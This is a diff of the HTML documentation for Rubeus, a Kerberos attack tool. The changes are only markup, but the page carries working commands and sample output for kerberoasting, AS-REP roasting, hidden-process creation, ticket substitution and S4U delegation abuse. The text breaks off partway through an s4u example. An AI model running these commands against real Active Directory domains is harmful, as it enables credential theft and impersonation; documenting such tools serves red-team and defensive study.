-<p>The <strong>kerberoast</strong> action replaces the <a href="https://github.com/GhostPack/SharpRoast" class="outbound" target="_blank"><span>SharpRoast</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project&#x27;s functionality. Like SharpRoast, this action uses the <a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx" class="outbound" target="_blank"><span>KerberosRequestorSecurityToken.GetRequest Method()</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> method that was contributed to PowerView by <a href="https://twitter.com/machosec" class="outbound" target="_blank"><span>@machosec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> in order to request the proper service ticket (for default behavior, <doc-anchor-trigger to="#kerberoasting-opsec">opsec table</doc-anchor-trigger> for more detail). Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.</p>
+<p>The <strong>kerberoast</strong> action replaces the <a href="https://github.com/GhostPack/SharpRoast" class="outbound" target="_blank"><span>SharpRoast</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project&#x27;s functionality. Like SharpRoast, this action uses the <a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx" class="outbound" target="_blank"><span>KerberosRequestorSecurityToken.GetRequest Method()</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> method that was contributed to PowerView by <a href="https://twitter.com/machosec" class="outbound" target="_blank"><span>@machosec</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> in order to request the proper service ticket (for default behavior, <doc-anchor-trigger to="#kerberoasting-opsec">opsec table</doc-anchor-trigger> for more detail). Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.</p>
 <p>With no other arguments, all user accounts with SPNs set in the current domain are Kerberoasted, <em>requesting their highest supported encryption type</em> (see the <doc-anchor-trigger to="#kerberoasting-opsec">opsec table</doc-anchor-trigger>). The <code v-pre>/spn:X</code> argument roasts just the specified SPN, the <code v-pre>/user:X</code> argument roasts just the specified user, and the <code v-pre>/ou:X</code> argument roasts just users in the specific OU. The <code v-pre>/domain</code> and <code v-pre>/dc</code> arguments are optional, pulling system defaults as other actions do.</p>
 <p>The <code v-pre>/stats</code> flag will output statistics about kerberoastable users found, including a breakdown of supported encryption types and years user passwords were last set. This flag can be combined with other targeting options.</p>
 <p>The <code v-pre>/outfile:FILE</code> argument outputs roasted hashes to the specified file, one per line.</p>
@@ -2199,7 +2200,7 @@ Base64EncodedTicket   :
 </doc-anchor-target>
 <p>Kerberoasting all users in the current domain using the default <code v-pre>KerberosRequestorSecurityToken.GetRequest</code> method:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast
 
  ______        _
 (_____ \      | |
@@ -2229,7 +2230,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>Kerberoasting all users in a specific OU, saving the hashes to an output file:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local /outfile:C:\Temp\hashes.txt
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local /outfile:C:\Temp\hashes.txt
 
  ______        _
 (_____ \      | |
@@ -2254,7 +2255,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>Perform Kerberoasting using the <code v-pre>tgtdeleg</code> trick to get a usable TGT, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 3 service tickets:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /tgtdeleg /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:3
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /tgtdeleg /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:3
 
    ______        _
   (_____ \      | |
@@ -2302,7 +2303,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>List statistics about found Kerberoastable accounts without actually sending ticket requests:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /stats
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /stats
 
    ______        _
   (_____ \      | |
@@ -2339,7 +2340,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>Kerberoasting a specific user, with simplified hash output:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /user:harmj0y /simple
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /user:harmj0y /simple
 
    ______        _
   (_____ \      | |
@@ -2365,7 +2366,7 @@ $krb5tgs$18$*harmj0y$theshire.local$testspn/server*$F63783C58AA153F24DFCC796A120
 </doc-codeblock></div>
 <p>Kerberoasting all users in a foreign <em>trusting</em> domain, not line-wrapping the results:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /domain:dev.testlab.local /nowrap
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /domain:dev.testlab.local /nowrap
 
  ______        _
 (_____ \      | |
@@ -2388,7 +2389,7 @@ v1.5.0
 </doc-codeblock></div>
 <p>Kerberoasting using an existing TGT:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /ticket:doIFujCCBbagAwIBBaEDAgEWoo...(snip)... /spn:&quot;asdf/asdfasdf&quot; /dc:primary.testlab.local
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /ticket:doIFujCCBbagAwIBBaEDAgEWoo...(snip)... /spn:&quot;asdf/asdfasdf&quot; /dc:primary.testlab.local
 
  ______        _
 (_____ \      | |
@@ -2409,7 +2410,7 @@ v1.3.5
 </doc-codeblock></div>
 <p>&quot;Opsec&quot; Kerberoasting, using the <strong>tgtdeleg</strong> trick, filtering out AES-enabled accounts:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /rc4opsec
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe kerberoast /rc4opsec
 
  ______        _
 (_____ \      | |
@@ -2441,14 +2442,14 @@ v1.3.6
         <span>asreproast</span>
     </h3>
 </doc-anchor-target>
-<p>The <strong>asreproast</strong> action replaces the <a href="https://github.com/HarmJ0y/ASREPRoast/" class="outbound" target="_blank"><span>ASREPRoast</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project which executed similar actions with the (larger sized) <a href="https://www.bouncycastle.org/" class="outbound" target="_blank"><span>BouncyCastle</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting. For more technical information, <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" class="outbound" target="_blank"><span>see this post</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
+<p>The <strong>asreproast</strong> action replaces the <a href="https://github.com/HarmJ0y/ASREPRoast/" class="outbound" target="_blank"><span>ASREPRoast</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project which executed similar actions with the (larger sized) <a href="https://www.bouncycastle.org/" class="outbound" target="_blank"><span>BouncyCastle</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting. For more technical information, <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" class="outbound" target="_blank"><span>see this post</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
 <p>Just as with the <doc-anchor-trigger to="#kerberoast">kerberoast</doc-anchor-trigger> command, if no other arguments are supplied, all user accounts not requiring with Kerberos preauth not required are roasted. The <code v-pre>/user:X</code> argument roasts just the specified user, and the <code v-pre>/ou:X</code> argument roasts just users in the specific OU. The <code v-pre>/domain</code> and <code v-pre>/dc</code> arguments are optional, pulling system defaults as other actions do.</p>
 <p>The <code v-pre>/outfile:FILE</code> argument outputs roasted hashes to the specified file, one per line.</p>
 <p>Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with <code v-pre>/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD</code>.</p>
-<p>The output <code v-pre>/format:X</code> defaults to John the Ripper (<a href="https://github.com/magnumripper/JohnTheRipper" class="outbound" target="_blank"><span>Jumbo version</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). <code v-pre>/format:hashcat</code> is also an option for the new hashcat mode 18200.</p>
+<p>The output <code v-pre>/format:X</code> defaults to John the Ripper (<a href="https://github.com/magnumripper/JohnTheRipper" class="outbound" target="_blank"><span>Jumbo version</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). <code v-pre>/format:hashcat</code> is also an option for the new hashcat mode 18200.</p>
 <p>AS-REP roasting all users in the current domain:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast
 
  ______        _
 (_____ \      | |
@@ -2502,7 +2503,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>AS-REP roasting all users in a specific OU, saving the hashes to an output file in Hashcat format:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt
 
  ______        _
 (_____ \      | |
@@ -2533,7 +2534,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>AS-REP roasting a specific user:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /user:TestOU3user
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /user:TestOU3user
 
  ______        _
 (_____ \      | |
@@ -2564,7 +2565,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>AS-REP roasting all users in a foreign <em>trusting</em> domain:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /domain:dev.testlab.local
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /domain:dev.testlab.local
 
  ______        _
 (_____ \      | |
@@ -2594,7 +2595,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>AS-REP roasting users in a foreign non-trusting domain using alternate credentials:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /domain:external.local /creduser:&quot;EXTERNAL.local\administrator&quot; /credpassword:&quot;Password123!&quot;
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asreproast /domain:external.local /creduser:&quot;EXTERNAL.local\administrator&quot; /credpassword:&quot;Password123!&quot;
 
  ______        _
 (_____ \      | |
@@ -2672,7 +2673,7 @@ v1.3.4
 <p>The <strong>createnetonly</strong> action will use the CreateProcessWithLogonW() API to create a new hidden (unless <code v-pre>/show</code> is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Kerberos tickets to with the <doc-anchor-trigger to="#ptt">ptt /luid:0xA..</doc-anchor-trigger> parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.</p>
 <p>Create a hidden upnpcont.exe process:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\upnpcont.exe&quot;
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\upnpcont.exe&quot;
 
  ______        _
 (_____ \      | |
@@ -2693,7 +2694,7 @@ v1.3.3
 </doc-codeblock></div>
 <p>Create a visible command prompt:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\cmd.exe&quot; /show
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\cmd.exe&quot; /show
 
  ______        _
 (_____ \      | |
@@ -2721,7 +2722,7 @@ v1.3.3
 <p>The <strong>changepw</strong> action will take a user&#x27;s TGT .kirbi blog and execute a MS kpasswd password change with the specified <code v-pre>/new:PASSWORD</code> value. If a <code v-pre>/dc</code> is not specified, the computer&#x27;s current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo&#x27;s <strong>misc::changepw</strong> function.</p>
 <p>You can retrieve a TGT blob using the <doc-anchor-trigger to="#asktgt">asktgt</doc-anchor-trigger> command.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!
 
  ______        _
 (_____ \      | |
@@ -2754,7 +2755,7 @@ v1.3.3
 <p>The <strong>hash</strong> action will take a <code v-pre>/password:X</code> and optional <code v-pre>/user:USER</code> and/or <code v-pre>/domain:DOMAIN</code>. It will generate the rc4_hmac (NTLM) representation of the password using @gentilkiwi&#x27;s <strong>kerberos:hash</strong> (KERB_ECRYPT HashPassword) approach. If user and domain names are specified, the aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hash forms are generated. The user and domain names are used as salts for the AES and DES implementations.</p>
 <p>Calculating the rc4_hmac of a password:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe hash /password:Password123!
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe hash /password:Password123!
 
  ______        _
 (_____ \      | |
@@ -2775,7 +2776,7 @@ v1.4.0
 </doc-codeblock></div>
 <p>Calculating all hash formats:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe hash /password:Password123! /user:harmj0y /domain:testlab.local
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe hash /password:Password123! /user:harmj0y /domain:testlab.local
 
  ______        _
 (_____ \      | |
@@ -2805,11 +2806,11 @@ v1.4.0
     </h3>
 </doc-anchor-target>
 <p>The <strong>tgssub</strong> action will take a service ticket base64 blob/file specification and substitute an alternate service name into the ticket. This is useful for S4U abuse and other scenarios.</p>
-<p>The <code v-pre>/altservice:X</code> flag is required and can either be a standalone sname (ldap, cifs, etc.) or a full service principal name (cifs/computer.domain.com). The latter is useful in some S4U2self abuse scenarios with resource-based constrained delegation. See Elad Shamir&#x27;s <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" class="outbound" target="_blank"><span>post on the topic</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> for more information.</p>
+<p>The <code v-pre>/altservice:X</code> flag is required and can either be a standalone sname (ldap, cifs, etc.) or a full service principal name (cifs/computer.domain.com). The latter is useful in some S4U2self abuse scenarios with resource-based constrained delegation. See Elad Shamir&#x27;s <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" class="outbound" target="_blank"><span>post on the topic</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> for more information.</p>
 <p>The <code v-pre>/ptt</code> flag will &quot;pass-the-ticket&quot; and apply the resulting Kerberos credential to the current logon session. The <code v-pre>/luid:0xA..</code> flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.</p>
 <p>Executing the S4U2self/S4U2proxy proces to abuse traditional constrained delegation, and replacing the sname in the final ticket. This is so you don&#x27;t have to execute the S4U process for a second time:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /msdsspn:ldap/PRIMARY.testlab.local /impersonateuser:harmj0y /ptt
